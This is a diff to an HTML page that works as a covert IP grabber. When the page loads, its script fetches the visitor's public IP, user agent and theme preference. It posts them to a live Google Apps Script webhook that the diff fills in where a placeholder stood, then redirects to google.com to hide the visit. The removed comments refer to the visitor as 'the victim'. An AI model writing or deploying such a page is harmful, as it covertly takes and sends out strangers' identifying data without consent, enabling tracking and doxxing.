@@ -1,34 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        async function track() {
-            // Get device & browser info
-            let device = navigator.userAgent;
-            let theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
+   <script>
+    async function track() {
+        let device = navigator.userAgent;
+        let theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
 
-            // Get public IP
-            let ipResponse = await fetch("https://api64.ipify.org?format=json");
-            let ipData = await ipResponse.json();
-            let ip = ipData.ip;
+        let ipResponse = await fetch("https://api64.ipify.org?format=json");
+        let ipData = await ipResponse.json();
+        let ip = ipData.ip;
 
-            // Send data to webhook (Google Sheets or Discord)
-            let webhookURL = "YOUR_WEBHOOK_URL_HERE";
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    ip: ip,
-                    device: device,
-                    theme: theme,
-                    time: new Date().toLocaleString()
-                })
-            });
+        let webhookURL = "https://script.google.com/macros/s/AKfycbwL20SvPJ1EpVgUJR2vHOBaohV33FdmWooh-ZpXbxy-Ld9ThTBNroJExmhmkwNCO-kT/exec";
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ip: ip, device: device, theme: theme, time: new Date().toLocaleString() })
+        });
 
-            // Redirect the victim (change this URL)
-            window.location.href = "https://google.com"; 
-        }
-    </script>
+        window.location.href = "https://google.com"; 
+    }
+</script>
+
 </head>
 <body onload="track()">
 </body>
